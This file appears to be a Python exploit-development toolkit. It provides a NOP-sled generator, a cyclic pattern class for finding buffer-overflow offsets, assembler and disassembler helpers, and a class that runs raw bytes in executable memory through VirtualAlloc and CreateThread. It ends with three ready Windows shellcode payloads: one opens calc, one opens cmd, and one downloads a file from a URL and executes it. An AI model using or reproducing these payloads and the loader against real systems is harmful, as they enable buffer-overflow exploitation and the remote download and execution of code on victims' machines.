# Imports
from config import *



seta="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
setb="abcdefghijklmnopqrstuvwxyz"
setc="0123456789"

# It looks pretty on paper :p
def Nop(i):
    return "\x90"*i

# Uses ndisasm
def Disasm(sc, mode, bFile=False):
    ret = ""
    if bFile ==True:
        ret = execute("%s -b %d %s"%(NDISASM, mode, sc))
    else:
        open("tmp.bin", "wb").write(sc)
        ret = execute("%s -b %d tmp.bin"%(NDISASM, mode))
    return ret



def format_shellcode(output_from_Asm):
    t = "buf = ("
    for instruction in output_from_Asm:
        t = t+instruction+"\n"
    t=t.strip()+")"
    return t
    
def Asm(asmcode, raw=True):
    shellcode = []
    pattern = re.compile("([0-9A-F]{8})\s*([^\s]*)\s*(.*)")

    matches = pattern.findall(asmcode)
    for line in asmcode.splitlines():
        m = pattern.match(line)
        if m:
            (addr, bytes, code) = m.groups()
            sc = '"%s"' % to_hexstr(bytes.decode('hex'))
            shellcode += [(sc, "0x"+addr, code)]
    maxlen = max([len(x[0]) for x in shellcode])
    text = ""
    for (sc, addr, code) in shellcode:
        if raw==True:
            text+= "%s\n" %sc.ljust(maxlen+1)
        else:
            text += "%s # %s:    %s\n" % (sc.ljust(maxlen+1), addr, code)
    return text

"""

def Asm(asm):
    shellcode = []
    pattern = re.compile("([0-9A-F]{8})\s*([^\s]*)\s*(.*)")
    matches = pattern.findall(asm)
    for bytes in asm.splitlines():
        shellcode.append('"%s"' % to_hexstr(bytes.decode('hex')))
    return shellcode

"""




# I only made this class because I am "class-obsessed"
# After all its just using the join method of 'str'
class List(object):
    table = None
    def __init__(self,x):
        self.table=x
    def compile(self):
        return ''.join(self.table)

# Again, using a class looked nice, it's easy to find an 'offset', and it looks kool
# to use patt.offset()

class Pattern(object):
    pattern = None

    def __init__(self, length):
        string="" ; a=0 ; b=0 ; c=0
        while len(string) < length:
            string += seta[a] + setb[b] + setc[c]
            c+=1
            if c == len(setc):c=0;b+=1
            if b == len(setb):b=0;a+=1
            if a == len(seta):a=0
        self.pattern = string[:length]
    def get(self):
        return self.pattern

    def offset(self, value): # offset('valueOfEIP')
        if len(value) >= 8 and int(value, 16) > 0:
            value = int(value, 16)
        elif len(value) == 4:
            value = struct.unpack('<L', value)[0]
        else:
            value = int(value, 16)

        offset = self.pattern.find(struct.pack('<L',value))
        if offset == -1:
            found = False
        else:
            found = True
        while offset != -1:
            return int(offset)






class Shellcode(object):
    sc2exec = None
    def __init__(self, sc):
        self.sc2exec=bytearray(sc)
    def execute(self):
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(self.sc2exec)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
        buf = (ctypes.c_char * len(self.sc2exec)).from_buffer(self.sc2exec)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(self.sc2exec)))
        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
        # bad :c
        # ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))




WOpenCalc = ("\xba\x6a\x33\x5d\x9d\xdb\xcd\xd9\x74\x24\xf4\x58\x29"
"\xc9\xb1\x30\x83\xc0\x04\x31\x50\x0f\x03\x50\x65\xd1"
"\xa8\x61\x91\x97\x53\x9a\x61\xf8\xda\x7f\x50\x38\xb8"
"\xf4\xc2\x88\xca\x59\xee\x63\x9e\x49\x65\x01\x37\x7d"
"\xce\xac\x61\xb0\xcf\x9d\x52\xd3\x53\xdc\x86\x33\x6a"
"\x2f\xdb\x32\xab\x52\x16\x66\x64\x18\x85\x97\x01\x54"
"\x16\x13\x59\x78\x1e\xc0\x29\x7b\x0f\x57\x22\x22\x8f"
 "\x59\xe7\x5e\x86\x41\xe4\x5b\x50\xf9\xde\x10\x63\x2b"
"\x2f\xd8\xc8\x12\x80\x2b\x10\x52\x26\xd4\x67\xaa\x55"
"\x69\x70\x69\x24\xb5\xf5\x6a\x8e\x3e\xad\x56\x2f\x92"
"\x28\x1c\x23\x5f\x3e\x7a\x27\x5e\x93\xf0\x53\xeb\x12"
"\xd7\xd2\xaf\x30\xf3\xbf\x74\x58\xa2\x65\xda\x65\xb4"
"\xc6\x83\xc3\xbe\xea\xd0\x79\x9d\x60\x26\x0f\x9b\xc6"
"\x28\x0f\xa4\x76\x41\x3e\x2f\x19\x16\xbf\xfa\x5e\xe8"
"\xf5\xa7\xf6\x61\x50\x32\x4b\xec\x63\xe8\x8f\x09\xe0"
 "\x19\x6f\xee\xf8\x6b\x6a\xaa\xbe\x80\x06\xa3\x2a\xa7"
"\xb5\xc4\x7e\xc4\x58\x57\xe2\x0b")

WinDlExec = ("\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B"
"\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53"
"\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72"
"\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81"
"\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04"
"\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64"
"\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3"
"\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3"
"\x8B\x14\x8E\x03\xD3\x33\xC9\x51\x68\x2E"
"\x65\x78\x65\x68\x64\x65\x61\x64\x53\x52"
"\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62"
"\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2"
"\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C"
"\x51\x68\x6F\x6E\x2E\x64\x68\x75\x72\x6C"
"\x6D\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24"
"\x04\x33\xC9\x51\x66\xB9\x65\x41\x51\x33"
"\xC9\x68\x6F\x46\x69\x6C\x68\x6F\x61\x64"
"\x54\x68\x6F\x77\x6E\x6C\x68\x55\x52\x4C"
"\x44\x54\x50\xFF\xD2\x33\xC9\x8D\x54\x24"
"\x24\x51\x51\x52\xEB\x47\x51\xFF\xD0\x83"
"\xC4\x1C\x33\xC9\x5A\x5B\x53\x52\x51\x68"
"\x78\x65\x63\x61\x88\x4C\x24\x03\x68\x57"
"\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05\x8D"
"\x4C\x24\x18\x51\xFF\xD0\x83\xC4\x0C\x5A"
"\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03"
"\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69"
"\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF"
"\xFF\xFF") # + http://url.net/xy.txt

WCmd = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
    "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
    "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
    "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
    "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
    "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"
    "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
    "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
    "\x24\x20\x57\xFF\xD0")

WinShellcode = {"Calc":WOpenCalc, "Cmd":WCmd, "DownloadAndExecute":WinDlExec}





